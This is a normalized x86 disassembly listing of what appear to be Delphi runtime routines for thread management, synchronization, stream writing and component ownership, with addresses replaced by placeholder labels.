mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_41e570
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42049c
mov eax [ ebp - 0x14 ]
call sub_403154
retn
sub_42049c
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x18 ] eax
mov dl 0xa
mov eax [ ebp - 0x4 ]
call sub_4207c8
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_41e570
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41e570
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403154
mov eax [ ebp - 0xc ]
call sub_403154
retn
sub_42057c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4205c2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov ecx esi
mov edx [ ebx + 0x2c ]
call sub_40425c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4205e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4205c9
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_4205e0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_404210
mov [ esp ] eax
cmp [ esp ] 0xff
jle r-xdata
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41e570
mov eax esi
call sub_404410
mov edx eax
mov ecx [ esp ]
mov eax ebx
call sub_41e570
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xff
sub_420628
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_40435c
je r-xdata
mov eax esi
call sub_404210
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_404210
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_4207c8
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41e570
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_41e570
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_4207c8
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41e570
mov dl 0x6
mov eax ebx
call sub_4207c8
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41e570
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_41e570
sub_4206c0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_420705
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405c30
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_420628
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42070c
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_420714
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4207ba
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_405ae0
mov eax [ ebp - 0x8 ]
call sub_404210
mov edi eax
mov eax ebx
call sub_40479c
add eax eax
cmp edi eax
jge r-xdata
mov dl 0x12
mov eax esi
call sub_4207c8
mov eax ebx
call sub_40479c
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax esi
call sub_41e570
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx ebx
mov eax esi
call sub_41e570
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_4041d8
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_420628
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4207c1
lea eax [ ebp - 0xc ]
call sub_403f50
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
sub_4207dc
push ebp
mov ebp esp
push ebx
mov ebx [ eax + 0x20 ]
mov [ edx ] ebx
mov edx [ eax + 0x18 ]
mov [ ecx ] edx
mov edx [ ebp + 0xc ]
mov ecx [ eax + 0x1c ]
mov [ edx ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ eax + 0x28 ]
mov [ edx ] eax
pop ebx
pop ebp
retn 0x8
sub_420898
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7a0
call sub_403908
call sub_42084c
mov eax ebx
call sub_420858
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_420a26
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_420a07
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420a0e
mov eax [ ebp - 0xc ]
call sub_403154
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4185b0
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4184a0
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_4209d1
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4209a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_420a38
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax + 0xf ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
call sub_420874
test bl bl
je r-xdata
xor eax eax
push ebp
push sub_420a79
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_403f48
mov eax [ ebp - 0x4 ]
call sub_403154
sub_420a7e
call sub_4027ac
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] eax
call sub_403984
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax + 0xf ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
call sub_420874
test bl bl
je r-xdata
mov eax esi
call sub_403f48
mov eax [ ebp - 0x4 ]
call sub_403154
sub_420ae0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov esi eax
xor eax eax
push ebp
push sub_420b8a
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_403124
call sub_420880
mov [ esi + 0xe ] bl
mov [ esi + 0xc ] bl
push esi
push 0x4
lea eax [ esi + 0x8 ]
push eax
mov ecx sub_420a38
xor edx edx
xor eax eax
call sub_403f04
mov ebx eax
mov [ esi + 0x4 ] ebx
test ebx ebx
jne r-xdata
add esp 0xfffffff0
call sub_4034a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420b91
lea eax [ ebp - 0x10 ]
call sub_403f50
retn
call GetLastError
lea edx [ ebp - 0x10 ]
call sub_40aea0
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7a0
call sub_403908
sub_420bb0
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403144
mov eax [ esi + 0x38 ]
call sub_403154
call sub_42088c
test bl bl
jle r-xdata
push eax
call CloseHandle
mov eax esi
call sub_420f20
cmp [ esi + 0xc ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
mov eax esi
call sub_420f28
mov eax esi
call sub_420ef8
sub_420c24
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov ebx edx
xor eax eax
push ebp
push sub_420c92
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420c99
lea eax [ ebp - 0x14 ]
call sub_403f50
retn
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40aea0
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7a0
call sub_403908
sub_420ce0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi + 0x4 ]
push eax
call SetThreadPriority
cmp eax 0x1
sbb edx edx
inc edx
mov eax esi
call sub_420ca0
pop esi
pop ebx
retn
sub_420d0c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x4 ] edx
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
push 0x0
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_420e2e
push [ fs : eax ]
mov [ fs : eax ] esp
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_420e10
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_418454
call sub_420874
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ rw-data ] eax
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_420df1
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
call WaitForSingleObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420df8
push rw-data
call EnterCriticalSection
retn
mov eax [ ebp - 0xc ]
mov edx [ eax ]
mov eax [ rw-data ]
call [ rw-data ]
sub_420e4c
push ebp
mov ebp esp
mov [ eax + 0x20 ] eax
xor edx edx
mov [ eax + 0x30 ] edx
mov edx [ ebp + 0x8 ]
mov [ eax + 0x28 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x2c ] edx
lea edx [ eax + 0x20 ]
mov eax [ eax ]
call sub_420d0c
pop ebp
retn 0x8
sub_420e8c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0xe ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_420ed9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0xe ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SuspendThread
test eax eax
setge dl
mov eax [ ebp - 0x4 ]
call sub_420ca0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_420ef8
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x4 ]
push eax
call ResumeThread
mov esi eax
test esi esi
setge dl
mov eax ebx
call sub_420ca0
dec esi
jne r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xe ] 0x0
sub_420f28
push ebx
push esi
add esp 0xffffffd8
mov esi eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
push 0xffffffff
mov eax [ esp + 0x8 ]
push eax
call WaitForSingleObject
xor ebx ebx
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
push 0x40
push 0x3e8
push 0x0
lea eax [ esp + 0x10 ]
push eax
push 0x2
call MsgWaitForMultipleObjects
mov ebx eax
cmp ebx 0xffffffff
setne dl
mov eax esi
call sub_420ca0
cmp ebx 0x1
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x1c ]
push eax
call PeekMessageA
test ebx ebx
jne r-xdata
xor eax eax
call sub_420898
cmp ebx 0x2
jne r-xdata
jmp r-xdata
push esp
mov eax [ esp + 0x8 ]
push eax
call GetExitCodeThread
cmp eax 0x1
sbb edx edx
inc edx
mov eax esi
call sub_420ca0
mov eax [ esp ]
add esp 0x28
pop esi
pop ebx
retn
sub_420fcc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_421184
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_421018
push ebx
push esi
push ecx
call sub_403508
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_42126c
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_421214
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_418b80
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_4211dc
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_4034f0
lea eax [ ebx + 0x14 ]
call sub_40d130
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_4185b0
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_42109c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_41860c
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_418454
mov edx ebx
mov eax esi
call sub_42109c
sub_421130
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_418454
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebx + 0x10 ] eax
sub_42115c
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_41874c
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_403154
xor eax eax
mov [ ebx + 0x10 ] eax
sub_421184
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403350
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_421130
mov dl 0x1
mov eax ebx
call sub_4216a4
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_421654
sub_4211dc
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_4216a4
mov edx ebx
mov eax esi
call sub_42115c
pop edi
pop esi
pop ebx
retn
sub_421214
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_418698
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_4211dc
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_42115c
sub_42126c
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_4185b0
call sub_42126c
inc edi
dec esi
jne r-xdata
sub_4212a8
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_41874c
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_403154
xor eax eax
mov [ ebx + 0x14 ] eax
sub_4212cc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4212a8
mov edx ebx
mov eax esi
call sub_4212a8
pop esi
pop ebx
retn
sub_4212e8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_4212cc
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_4185b0
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_421344
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_4210f0
push ebx
push sub_421118
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_421104
push ebx
push sub_421124
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_42143c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_407e4c
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_4214d4
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7a0
call sub_403908
sub_4214d4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_4185b0
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_407e4c
test al al
jne r-xdata
sub_421524
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_40435c
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_407fd0
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7a0
call sub_403908
xor edx edx
mov eax ebx
call sub_4216a4
mov edx esi
mov eax ebx
call sub_4215b0
mov dl 0x1
mov eax ebx
call sub_4216a4
sub_4215c4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_4185b0
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_41853c
sub_421600
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_41860c
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_4184a0
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_41862c
sub_421654
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4215f0
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_4215c4
mov cl 0x1
mov edx ebx
call sub_421654
inc edi
dec ebp
jne r-xdata
sub_4216a4
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_4041ec
mov edx esp
mov eax esi
call sub_403450
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_4216ec
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_421714
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_42175c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_403208
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_42179c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_4217bc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_4217e0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403124
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_421828
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403144
test bl bl
jle r-xdata
mov edx esi
call sub_421a58
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_421890
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_421a58
mov edx ebx
mov eax esi
call sub_421a4c
sub_4218d4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420fcc
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
